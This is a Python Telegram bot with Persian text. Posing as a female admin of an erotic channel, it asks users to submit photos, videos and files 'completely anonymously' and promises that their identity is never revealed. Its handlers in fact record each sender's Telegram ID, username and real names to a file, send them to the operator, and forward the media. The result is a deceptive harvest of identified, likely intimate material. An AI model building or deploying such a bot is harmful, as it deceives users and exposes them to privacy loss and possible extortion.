import telebot
from telebot import types
import json
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_CHAT_ID = os.getenv("OWNER_CHAT_ID")
CHANNEL_LINK = "https://t.me/eroticx2"

if not BOT_TOKEN or not OWNER_CHAT_ID:
    print("❌ لطفاً فایل .env رو پر کنید!")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

DATA_FILE = "messages.json"

def load_messages():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_messages(messages):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(messages, f, ensure_ascii=False, indent=2)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📢 کانال ما", url=CHANNEL_LINK),
        types.InlineKeyboardButton("💬 راهنما", callback_data="help")
    )
    markup.add(
        types.InlineKeyboardButton("📷 ارسال عکس", callback_data="send_photo"),
        types.InlineKeyboardButton("🎥 ارسال ویدیو", callback_data="send_video")
    )
    markup.add(
        types.InlineKeyboardButton("📝 ارسال متن", callback_data="send_text"),
        types.InlineKeyboardButton("📎 ارسال فایل", callback_data="send_file")
    )
    
    welcome_text = (
        "سلام عزیزم 👋❤️\n\n"
        "من الهام هستم و ادمین کانال Eroticx🔥\n\n"
        "ازین به بعد از طریق این بات میتونید به صورت کاملاً ناشناس "
        "عکس و ویدیو هاتون رو ارسال کنید.\n\n"
        "🔒 هویت شما کاملاً محفوظه!\n\n"
        "یکی از گزینه‌های زیر رو انتخاب کنید 👇"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        help_text = (
            "📚 راهنما:\n\n"
            "🔹 عکس بفرستید → فوروارد میشه\n"
            "🔹 ویدیو بفرستید → فوروارد میشه\n"
            "🔹 متن بنویسید → فوروارد میشه\n"
            "🔹 فایل بفرستید → فوروارد میشه\n"
            "🔹 صدا بفرستید → فوروارد میشه\n"
            "🔹 استیکر بفرستید → فوروارد میشه\n\n"
            "🔒 هویت شما هیچوقت فاش نمیشه!\n\n"
            "📌 از منوی زیر شروع کنید 👇"
        )
        bot.answer_callback_query(call.id, "✅ راهنما")
        bot.send_message(call.message.chat.id, help_text)
    
    elif call.data == "send_photo":
        bot.answer_callback_query(call.id, "✅ عکست رو بفرست")
        bot.send_message(call.message.chat.id, "📷 عکست رو اینجا بفرست:")
    
    elif call.data == "send_video":
        bot.answer_callback_query(call.id, "✅ ویدیوت رو بفرست")
        bot.send_message(call.message.chat.id, "🎥 ویدیوت رو اینجا بفرست:")
    
    elif call.data == "send_text":
        bot.answer_callback_query(call.id, "✅ متنت رو بنویس")
        bot.send_message(call.message.chat.id, "📝 متنت رو اینجا بنویس:")
    
    elif call.data == "send_file":
        bot.answer_callback_query(call.id, "✅ فایلت رو بفرست")
        bot.send_message(call.message.chat.id, "📎 فایلت رو اینجا بفرست:")
    
    elif call.data == "back_to_menu":
        bot.answer_callback_query(call.id, "✅ برگشتی")
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📢 کانال ما", url=CHANNEL_LINK),
            types.InlineKeyboardButton("💬 راهنما", callback_data="help")
        )
        markup.add(
            types.InlineKeyboardButton("📷 ارسال عکس", callback_data="send_photo"),
            types.InlineKeyboardButton("🎥 ارسال ویدیو", callback_data="send_video")
        )
        markup.add(
            types.InlineKeyboardButton("📝 ارسال متن", callback_data="send_text"),
            types.InlineKeyboardButton("📎 ارسال فایل", callback_data="send_file")
        )
        bot.send_message(call.message.chat.id, "منوی اصلی 👇", reply_markup=markup)

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": message.caption if message.caption else "",
        "type": "photo",
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"🖼 عکس جدید ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}")
    
    bot.forward_message(OWNER_CHAT_ID, message.chat.id, message.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ عکس شما ارسال شد!", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": message.caption if message.caption else "",
        "type": "document",
        "file_name": message.document.file_name,
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"📎 فایل جدید ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}\n"
        f"📄 نام فایل: {message.document.file_name}")
    
    bot.forward_message(OWNER_CHAT_ID, message.chat.id, message.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ فایل شما ارسال شد!", reply_markup=markup)

@bot.message_handler(content_types=['video'])
def handle_video(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": message.caption if message.caption else "",
        "type": "video",
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"🎥 ویدیو جدید ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}")
    
    bot.forward_message(OWNER_CHAT_ID, message.chat.id, message.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ ویدیو شما ارسال شد!", reply_markup=markup)

@bot.message_handler(content_types=['voice'])
def handle_voice(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": "",
        "type": "voice",
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"🎤 صدا جدید ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}")
    
    bot.forward_message(OWNER_CHAT_ID, message.chat.id, message.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ صدای شما ارسال شد!", reply_markup=markup)

@bot.message_handler(content_types=['sticker'])
def handle_sticker(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": f"استیکر: {message.sticker.emoji or ''}",
        "type": "sticker",
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"😀 استیکر جدید ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}")
    
    bot.forward_message(OWNER_CHAT_ID, message.chat.id, message.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ استیکر شما ارسال شد!", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_message(message):
    if str(message.chat.id) == OWNER_CHAT_ID:
        return
    
    user_info = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "first_name": message.from_user.first_name,
        "last_name": message.from_user.last_name,
        "message": message.text,
        "type": "text",
        "date": datetime.now().isoformat()
    }
    
    messages = load_messages()
    messages.append(user_info)
    save_messages(messages)
    
    bot.send_message(OWNER_CHAT_ID, 
        f"📩 پیام متنی ناشناس:\n\n"
        f"👤 @{message.from_user.username or 'ندارد'}\n"
        f"🆔 آیدی: {message.from_user.id}\n"
        f"📝 پیام:\n{message.text}")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 بازگشت به منو", callback_data="back_to_menu"))
    bot.send_message(message.chat.id, "✅ پیام شما ارسال شد!", reply_markup=markup)

@bot.message_handler(commands=['messages'])
def show_messages(message):
    if str(message.chat.id) != OWNER_CHAT_ID:
        bot.reply_to(message, "⛔ شما دسترسی به این بخش ندارید.")
        return
    
    messages = load_messages()
    if not messages:
        bot.reply_to(message, "📭 پیامی وجود ندارد.")
        return
    
    response = "📋 لیست پیام‌های دریافتی:\n\n"
    for i, msg in enumerate(messages[-10:], 1):
        response += (
            f"{i}. @{msg.get('username', 'ندارد')} "
            f"(ID: {msg['user_id']})\n"
            f"   {msg['message']}\n\n"
        )
    
    bot.reply_to(message, response)

if __name__ == "__main__":
    print("🤖 بات در حال اجراست...")
    bot.polling(none_stop=True)
